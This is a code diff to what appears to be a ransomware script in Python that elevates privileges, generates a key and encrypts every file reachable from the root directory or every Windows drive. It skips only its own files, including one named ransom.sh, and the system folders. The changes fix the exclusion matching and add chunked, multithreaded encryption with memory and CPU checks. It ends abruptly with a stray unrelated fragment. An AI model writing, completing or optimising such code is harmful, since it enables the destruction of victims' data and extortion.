@@ -49,10 +49,10 @@ def encrypt_file(file_path, key, exclude_paths):
 
 def find_files_to_encrypt(root_dir, exclude_paths):
     for root, dirs, files in os.walk(root_dir):
-        dirs[:] = [d for d in dirs if os.path.join(root, d) not in exclude_paths]
+        dirs[:] = [d for d in dirs if not any(os.path.join(root, d).startswith(exclude) for exclude in exclude_paths)]
         for file in files:
             file_path = os.path.join(root, file)
-            if file_path not in exclude_paths:
+            if not any(file_path.startswith(exclude) for exclude in exclude_paths):
                 yield file_path
 
 def handle_bus_error(signum, frame):
@@ -69,22 +69,61 @@ def encrypt_files(root_dir, key, exclude_paths):
             except Exception as e:
                 logging.error(f"Error encrypting file: {e}")
 
+def encrypt_files_with_resource_checks(root_dir, key, exclude_paths, chunk_size=10):
+    files = find_files_to_encrypt(root_dir, exclude_paths)
+    file_chunk = []
+    
+    for file in files:
+        file_chunk.append(file)
+        if len(file_chunk) >= chunk_size:
+            process_file_chunk(file_chunk, key, exclude_paths)
+            file_chunk = []
+    
+    if file_chunk:
+        process_file_chunk(file_chunk, key, exclude_paths)
+
+def process_file_chunk(file_chunk, key, exclude_paths):
+    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
+    cpu_usage = psutil.cpu_percent(interval=1)
+    logging.debug(f"Available memory: {available_memory:.2f}%, CPU usage: {cpu_usage:.2f}%")
+    
+    if available_memory < 20:  # If available memory is less than 20%
+        logging.warning("Low memory. Pausing encryption for 5 seconds...")
+        time.sleep(5)
+    
+    with ThreadPoolExecutor() as executor:
+        futures = {executor.submit(encrypt_file, file, key, exclude_paths): file for file in file_chunk}
+        for future in as_completed(futures):
+            try:
+                future.result()
+            except Exception as e:
+                logging.error(f"Error encrypting file: {e}")
+
 def main():
     setup_logging()
     elevate_privileges_if_needed()
     key = generate_encryption_key()
+    
     # Convert exclude_paths to absolute paths
-    exclude_paths = set([os.path.abspath(path) for path in ["main.py", "encryption.key", "decrypt.py", "ransom.sh"]])
+    script_dir = os.path.abspath(os.path.dirname(__file__))
+    exclude_files = ["main.py", "encryption.key", "decrypt.py", "ransom.sh"]
+    exclude_paths = {os.path.join(script_dir, file) for file in exclude_files}
+    
     system_paths = ["/usr", "/bin", "/lib", "/etc", "/var", "/opt", "/sbin", "/dev", "/proc", "/sys"]
     # Convert system_paths to absolute paths before updating exclude_paths
     exclude_paths.update([os.path.abspath(path) for path in system_paths])
+    
+    logging.debug(f"Exclude paths: {exclude_paths}")
+    
     signal.signal(signal.SIGBUS, handle_bus_error)
     root_dirs = ["/"] if platform.system() == "Linux" else [f"{chr(drive)}:\\" for drive in range(65, 91) if os.path.exists(f"{chr(drive)}:\\")]
+    
     for root_dir in root_dirs:
-        encrypt_files(root_dir, key, exclude_paths)
+        encrypt_files_with_resource_checks(root_dir, key, exclude_paths)
 
 if __name__ == "__main__":
     main()
+
 
 
     bird = """
